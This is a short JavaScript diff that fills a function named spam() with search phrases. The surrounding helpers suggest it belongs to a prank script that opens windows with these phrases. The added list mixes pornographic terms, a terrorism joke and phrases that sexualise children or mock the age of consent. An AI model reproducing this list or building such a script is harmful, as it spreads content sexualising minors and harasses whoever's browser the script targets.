@@ -16,7 +16,7 @@ function randomizeParams() {
 }
 
 function spam() {
-  const words = ["word 1", "word2"];
+  const words = ["island boys kissing","isis application form","penis enlargment pills","pornhub gay","free v bucks generators","why is age of consent so old here","free gay porn","little boys kissing","gay hentai","massive gay orgy","fortnite sus emotes to do","thicc chun li hips","chun li doing party hips 10 hours loop"];
   let index = 0;
 
   function openWindow() {
